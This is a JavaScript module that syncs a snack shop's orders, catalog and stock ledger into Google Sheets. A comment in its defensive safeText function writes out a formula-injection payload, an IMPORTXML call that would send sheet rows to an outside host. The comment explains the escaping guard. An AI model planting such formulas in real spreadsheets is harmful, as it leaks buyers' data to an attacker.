import { sheets as sheetsApi, auth as googleAuth } from '@googleapis/sheets';
import config from '../config.js';
import log from './logger.js';

/**
 * Google Sheets collation.
 *
 * Postgres is the system of record; the spreadsheet is the human-readable
 * ledger the committee actually opens. Every write here is best-effort: if
 * Google is down or the credentials lapse, orders must still go through, so
 * failures are logged and swallowed rather than thrown at the buyer.
 */

const SCOPES = ['https://www.googleapis.com/auth/spreadsheets'];

/** Tab layouts. Order matters, it is the column order in the sheet. */
export const TABS = {
  orders: {
    title: 'Orders',
    headers: [
      'Order Code', 'Placed At (SGT)', 'Status', 'Buyer Name', 'Telegram ID', 'Username',
      'Items', 'Units', 'Total (SGD)', 'Collection Point(s)', 'Payment Ref', 'Note',
      'Proof', 'Verified By', 'Verified At (SGT)', 'Review Note', 'Updated At (SGT)',
    ],
  },
  orderItems: {
    title: 'Order Items',
    headers: [
      'Order Code', 'Placed At (SGT)', 'Buyer Name', 'Category', 'SKU', 'Item', 'Variant',
      'Unit Price (SGD)', 'Qty', 'Line Total (SGD)', 'Status',
    ],
  },
  catalog: {
    title: 'Items & Stock',
    headers: [
      'SKU', 'Type', 'Category', 'Collection Point', 'Name', 'Variant', 'Description',
      'Price (SGD)', 'Stock', 'Reserved', 'Available', 'Low Stock At', 'Low?',
      'Active', 'Special', 'Updated At (SGT)',
    ],
  },
  stock: {
    title: 'Stock Movements',
    headers: [
      'Timestamp (SGT)', 'SKU', 'Item', 'Delta', 'Balance After', 'Reason',
      'Order Code', 'Admin', 'Note',
    ],
  },
};

/** Zero-based column index of a header, so a range never hard-codes a letter. */
function columnOf(tab, header) {
  const index = tab.headers.indexOf(header);
  if (index < 0) throw new Error(`${tab.title} has no "${header}" column`);
  return index;
}

let sheetsClient = null;
let ensuredTabs = false;

function credentialsPresent() {
  return Boolean(
    config.sheets.enabled &&
    config.sheets.spreadsheetId &&
    config.sheets.serviceAccountEmail &&
    config.sheets.privateKey
  );
}

export function sheetsEnabled() {
  return credentialsPresent();
}

async function client() {
  if (sheetsClient) return sheetsClient;
  if (!credentialsPresent()) return null;

  // A stub endpoint has no OAuth to satisfy, so the key is passed as a plain
  // string rather than signed for. Production never takes this branch.
  if (config.sheets.apiRoot) {
    sheetsClient = sheetsApi({
      version: 'v4',
      auth: config.sheets.privateKey,
      rootUrl: config.sheets.apiRoot,
    });
    return sheetsClient;
  }

  const auth = new googleAuth.JWT({
    email: config.sheets.serviceAccountEmail,
    key: config.sheets.privateKey,
    scopes: SCOPES,
  });
  await auth.authorize();
  sheetsClient = sheetsApi({ version: 'v4', auth });
  return sheetsClient;
}

/**
 * Serialise every call to Google.
 *
 * Half of the work here is read-then-write: find the row holding an order,
 * then update it. Two of those interleaved race, and the loser overwrites a
 * row that has moved, or appends a duplicate. Sheets also rate-limits per
 * user, and a stock-take of twenty items fired off in parallel is exactly the
 * burst it answers with 429. One at a time is fast enough for a snack shop
 * and removes both problems.
 */
let chain = Promise.resolve();
function serialise(task) {
  const run = chain.then(task, task);
  // Keep the chain alive whatever happens; each caller handles its own error.
  chain = run.then(() => undefined, () => undefined);
  return run;
}

/**
 * A1 notation needs the sheet name quoted whenever it is not a bare word, and
 * ours are "Items & Stock" and "Order Items". Unquoted, Google answers
 * "Unable to parse range" and every write to those tabs fails, which is not
 * obvious from the shop: orders go through and simply never appear.
 *
 * A literal apostrophe inside a sheet name is doubled, per the same notation.
 */
function range(tab, a1) {
  return `'${tab.title.replace(/'/g, "''")}'!${a1}`;
}

/** Column letter for a zero-based index (0 -> A, 26 -> AA). */
function columnLetter(index) {
  let n = index + 1;
  let out = '';
  while (n > 0) {
    const rem = (n - 1) % 26;
    out = String.fromCharCode(65 + rem) + out;
    n = Math.floor((n - 1) / 26);
  }
  return out;
}

/** Singapore time, formatted the way a spreadsheet sorts sensibly. */
export function sgt(date = new Date()) {
  const d = date instanceof Date ? date : new Date(date);
  if (Number.isNaN(d.getTime())) return '';
  const parts = new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Asia/Singapore',
    year: 'numeric', month: '2-digit', day: '2-digit',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: false,
  }).formatToParts(d).reduce((acc, p) => { acc[p.type] = p.value; return acc; }, {});
  return `${parts.year}-${parts.month}-${parts.day} ${parts.hour}:${parts.minute}:${parts.second}`;
}

const money = (cents) => (Number(cents ?? 0) / 100).toFixed(2);

/**
 * Stop text a shopper wrote from being run as a spreadsheet formula.
 *
 * Cells go in as USER_ENTERED so prices and counts land as numbers a person
 * can sum, rather than as strings. The same setting means a value opening with
 * = + - @ is treated as a formula. Buyers choose their own name and note and
 * nothing constrains the characters, so without this somebody could order
 * under the name =IMPORTXML("https://.../"&A2,"//x") and have the committee's
 * own spreadsheet post its rows to them the moment the tab was opened.
 *
 * A leading apostrophe tells Sheets to keep the rest as literal text. It is
 * stored, not displayed, so the cell still reads the way it was typed.
 *
 * Numbers pass through untouched, which is what keeps the numeric columns
 * numeric.
 */
function safeText(value) {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number') return value;
  const text = String(value);
  return /^[=+\-@\t\r\n]/.test(text) ? `'${text}` : text;
}

/** Every cell of a row, guarded. */
const safeRow = (cells) => cells.map(safeText);

/**
 * Create any missing tab, size it to its layout and write its header row.
 *
 * Runs once per process and is safe against a spreadsheet that already has
 * the tabs. A tab someone made by hand can be narrower than our layout, and a
 * write past the last column is refused outright, so existing tabs are grown
 * to fit rather than assumed to.
 */
export async function ensureTabs(force = false) {
  const api = await client();
  if (!api) return false;
  if (ensuredTabs && !force) return true;

  const spreadsheetId = config.sheets.spreadsheetId;
  const meta = await api.spreadsheets.get({ spreadsheetId });
  const existing = new Map(
    (meta.data.sheets ?? []).map((s) => [s.properties.title, s.properties])
  );

  const requests = [];
  for (const tab of Object.values(TABS)) {
    const width = Math.max(tab.headers.length, 12);
    const found = existing.get(tab.title);

    if (!found) {
      requests.push({
        addSheet: {
          properties: {
            title: tab.title,
            gridProperties: { rowCount: 5000, columnCount: width, frozenRowCount: 1 },
          },
        },
      });
      continue;
    }

    // Grow a tab that is too small for the layout. Sheets refuses any range
    // beyond the grid, so one narrow tab silently kills every write to it.
    const grid = found.gridProperties ?? {};
    const columnCount = Math.max(grid.columnCount ?? 0, width);
    const rowCount = Math.max(grid.rowCount ?? 0, 1000);
    if (columnCount !== grid.columnCount || rowCount !== grid.rowCount) {
      requests.push({
        updateSheetProperties: {
          properties: { sheetId: found.sheetId, gridProperties: { rowCount, columnCount } },
          fields: 'gridProperties.rowCount,gridProperties.columnCount',
        },
      });
    }
  }

  if (requests.length) {
    await api.spreadsheets.batchUpdate({ spreadsheetId, requestBody: { requests } });
  }

  // Write headers for every tab we own (cheap, and self-heals a mangled header).
  await api.spreadsheets.values.batchUpdate({
    spreadsheetId,
    requestBody: {
      valueInputOption: 'RAW',
      data: Object.values(TABS).map((t) => ({
        range: range(t, 'A1'),
        values: [t.headers],
      })),
    },
  });

  ensuredTabs = true;
  log.info('Google Sheets tabs ready', { adjusted: requests.length });
  return true;
}

/** Append rows and report the 1-based row number the first one landed on. */
async function append(tab, rows) {
  const api = await client();
  if (!api || rows.length === 0) return 0;
  await ensureTabs();
  const res = await api.spreadsheets.values.append({
    spreadsheetId: config.sheets.spreadsheetId,
    range: range(tab, 'A1'),
    valueInputOption: 'USER_ENTERED',
    insertDataOption: 'INSERT_ROWS',
    requestBody: { values: rows },
  });
  // "'Orders'!A42:Q42" -> 42
  const updated = res.data?.updates?.updatedRange ?? '';
  const match = updated.match(/![A-Z]+(\d+)/);
  return match ? Number(match[1]) : 0;
}

/** Every 1-based row number in a tab whose first column holds `code`. */
async function findRowsByCode(tab, code) {
  const api = await client();
  if (!api) return [];
  const res = await api.spreadsheets.values.get({
    spreadsheetId: config.sheets.spreadsheetId,
    range: range(tab, 'A:A'),
  });
  const values = res.data.values ?? [];
  const rows = [];
  for (let i = 1; i < values.length; i += 1) {      // skip the header
    if ((values[i]?.[0] ?? '') === code) rows.push(i + 1);
  }
  return rows;
}

// ---------------------------------------------------------------------------
// Public writes
// ---------------------------------------------------------------------------

/** The Orders-tab row for one order, in header order. */
function orderRowFor({ order, items, user }) {
  const summary = items
    .map((i) => `${i.quantity}x ${[i.name, i.variant].filter(Boolean).join(' - ')}`)
    .join('; ');

  return [
    order.code,
    sgt(order.created_at),
    order.status,
    order.buyer_name,
    String(order.telegram_id),
    user?.username ? `@${user.username}` : '',
    summary,
    items.reduce((sum, i) => sum + i.quantity, 0),
    money(order.total_cents),
    (order.collection_points ?? []).join(' + '),
    order.payment_ref ?? '',
    order.note ?? '',
    order.payment_proof_id ? `Yes (${order.proof_source ?? 'app'})` : 'No',
    order.reviewer_name ?? '',
    order.reviewed_at ? sgt(order.reviewed_at) : '',
    order.review_note ?? '',
    sgt(new Date()),
  ];
}

/**
 * Write an order into the spreadsheet, or refresh the row it already has.
 *
 * Called on every transition, not only on approval. An order that exists in
 * the shop but not in the sheet is exactly the gap the committee notices:
 * they open the tab to see who has ordered what, and find only the ones an
 * admin has already got round to verifying.
 *
 * `knownRow` is the row we wrote last time. It saves a scan of column A, and
 * it is verified before being written over, so a sorted or re-arranged sheet
 * falls back to searching rather than overwriting somebody else's order.
 *
 * Returns the row number the order now occupies, or 0 when nothing was
 * written, so the caller can remember it.
 */
export async function upsertOrder({ order, items, user, knownRow = null }) {
  if (!credentialsPresent()) return 0;

  return serialise(async () => {
    try {
      const api = await client();
      await ensureTabs();

      const cells = safeRow(orderRowFor({ order, items, user }));
      const lastColumn = columnLetter(cells.length - 1);

      let row = 0;
      if (knownRow && knownRow > 1) {
        const check = await api.spreadsheets.values.get({
          spreadsheetId: config.sheets.spreadsheetId,
          range: range(TABS.orders, `A${knownRow}`),
        });
        if ((check.data.values?.[0]?.[0] ?? '') === order.code) row = knownRow;
      }
      if (!row) row = (await findRowsByCode(TABS.orders, order.code))[0] ?? 0;

      if (row > 1) {
        await api.spreadsheets.values.update({
          spreadsheetId: config.sheets.spreadsheetId,
          range: range(TABS.orders, `A${row}:${lastColumn}${row}`),
          valueInputOption: 'USER_ENTERED',
          requestBody: { values: [cells] },
        });
        await refreshOrderItemStatus(order);
        return row;
      }

      const placed = sgt(order.created_at);
      const written = await append(TABS.orders, [cells]);
      await append(
        TABS.orderItems,
        items.map((i) => safeRow([
          order.code, placed, order.buyer_name, i.category_name ?? '', i.sku, i.name,
          i.variant ?? '', money(i.unit_price_cents), i.quantity, money(i.line_total_cents),
          order.status,
        ]))
      );
      return written;
    } catch (err) {
      log.error('Sheets upsertOrder failed', { code: order?.code, error: err.message });
      return 0;
    }
  });
}

/**
 * Restate the Status cell on an order's line-item rows.
 *
 * The Order Items tab is what anyone pivots on to see what actually sold, so
 * leaving every line reading "awaiting_payment" for an order that was paid an
 * hour ago makes that tab worse than useless.
 */
async function refreshOrderItemStatus(order) {
  const api = await client();
  if (!api) return;
  const rows = await findRowsByCode(TABS.orderItems, order.code);
  if (rows.length === 0) return;

  const column = columnLetter(columnOf(TABS.orderItems, 'Status'));
  await api.spreadsheets.values.batchUpdate({
    spreadsheetId: config.sheets.spreadsheetId,
    requestBody: {
      valueInputOption: 'RAW',
      data: rows.map((row) => ({
        range: range(TABS.orderItems, `${column}${row}`),
        values: [[safeText(order.status)]],
      })),
    },
  });
}

/** Mirror the whole catalog into the "Items & Stock" tab. */
export async function syncCatalog(rows) {
  if (!credentialsPresent()) return false;

  return serialise(async () => {
    try {
      const api = await client();
      await ensureTabs();

      const values = rows.map((i) => {
        const available = Math.max((i.stock ?? 0) - (i.reserved ?? 0), 0);
        return safeRow([
          i.sku,
          i.category?.kind === 'drink' ? 'Drink' : 'Snack',
          i.category?.name ?? '',
          i.category?.collection_point ?? '',
          i.name,
          i.variant ?? '',
          i.description ?? '',
          money(i.price_cents),
          i.stock ?? 0,
          i.reserved ?? 0,
          available,
          i.low_stock_at ?? 0,
          available <= (i.low_stock_at ?? 0) ? 'LOW' : '',
          i.is_active ? 'Yes' : 'No',
          i.is_special ? 'Yes' : '',
          sgt(i.updated_at),
        ]);
      });

      const lastColumn = columnLetter(TABS.catalog.headers.length - 1);

      // Clear the data range first so deleted items do not linger as ghosts.
      // Bounded to the tab's own columns and left open-ended on rows: Sheets
      // refuses any range past the grid, and a guess like A2:Z5000 is past it
      // on a 16-column tab, which fails the whole sync rather than the cell.
      await api.spreadsheets.values.clear({
        spreadsheetId: config.sheets.spreadsheetId,
        range: range(TABS.catalog, `A2:${lastColumn}`),
      });
      if (values.length) {
        await api.spreadsheets.values.update({
          spreadsheetId: config.sheets.spreadsheetId,
          range: range(TABS.catalog, 'A2'),
          valueInputOption: 'USER_ENTERED',
          requestBody: { values },
        });
      }
      log.info('Sheets catalog synced', { rows: values.length });
      return true;
    } catch (err) {
      log.error('Sheets syncCatalog failed', { error: err.message });
      return false;
    }
  });
}

/**
 * Read the "Items & Stock" tab back.
 *
 * The sheet is a mirror, but the committee edits it: a price gets corrected
 * on a phone in the pantry long before anyone opens the admin panel. This is
 * the return leg, whatever a human typed, parsed into the shape the importer
 * expects. Derived columns (Reserved, Available, Low?, Updated At) are read
 * past, because writing them back would just be an echo.
 *
 * Anything unparseable is reported rather than guessed at: a price cell
 * holding "1.20 (was 1.50)" must not silently become $1.20.
 */
export async function readCatalogTab() {
  const api = await client();
  if (!api) return null;

  const lastColumn = columnLetter(TABS.catalog.headers.length - 1);
  const res = await api.spreadsheets.values.get({
    spreadsheetId: config.sheets.spreadsheetId,
    range: range(TABS.catalog, `A2:${lastColumn}`),
  });

  const rows = res.data.values ?? [];
  const out = [];

  rows.forEach((row, i) => {
    const sku = String(row[0] ?? '').trim();
    if (!sku) return;                       // blank spacer row, not an error

    const problems = [];
    const cell = (n) => String(row[n] ?? '').trim();

    const name = cell(4);
    if (!name) problems.push('the Name cell is empty');

    // "$1.20", "1.20", "1,20": a person typed it, so be forgiving about the
    // decoration but strict about the result.
    const rawPrice = cell(7).replace(/[$\s]/g, '').replace(',', '.');
    const price = Number(rawPrice);
    if (rawPrice === '' || !Number.isFinite(price) || price < 0) {
      problems.push(`"${cell(7)}" is not a price`);
    }

    const int = (raw, label) => {
      if (raw === '') return null;
      const n = Number(raw);
      if (!Number.isInteger(n) || n < 0) { problems.push(`"${raw}" is not a ${label}`); return null; }
      return n;
    };
    const stock = int(cell(8), 'stock count');
    const lowStockAt = int(cell(11), 'low-stock threshold');

    // syncCatalog writes Yes/No and Yes/blank; accept the obvious variants a
    // person might type over them.
    const flag = (raw, fallback) => {
      const v = raw.toLowerCase();
      if (['yes', 'y', 'true', '1', 'x'].includes(v)) return true;
      if (['no', 'n', 'false', '0'].includes(v)) return false;
      if (v === '') return fallback;
      problems.push(`"${raw}" is not a yes/no`);
      return fallback;
    };

    out.push({
      row: i + 2,                           // 1-based, past the header
      sku,
      name,
      variant: cell(5) || null,
      description: cell(6) || null,
      priceCents: Math.round(price * 100),
      stock,
      lowStockAt,
      isActive: flag(cell(13), true),
      isSpecial: flag(cell(14), false),
      problems,
    });
  });

  return out;
}

/** Append stock movements to the ledger tab. Takes one or many. */
export async function recordStockMovement(movements) {
  if (!credentialsPresent()) return false;
  const list = Array.isArray(movements) ? movements : [movements];
  if (list.length === 0) return false;

  return serialise(async () => {
    try {
      await append(TABS.stock, list.map((m) => safeRow([
        sgt(m.created_at ?? new Date()),
        m.sku ?? '',
        m.item_name ?? '',
        m.delta ?? 0,
        m.balance_after ?? 0,
        m.reason ?? '',
        m.order_code ?? '',
        m.actor_name ?? '',
        m.note ?? '',
      ])));
      return true;
    } catch (err) {
      log.error('Sheets recordStockMovement failed', { error: err.message });
      return false;
    }
  });
}

export default {
  sheetsEnabled, ensureTabs, upsertOrder, syncCatalog, readCatalogTab,
  recordStockMovement, sgt, TABS,
};
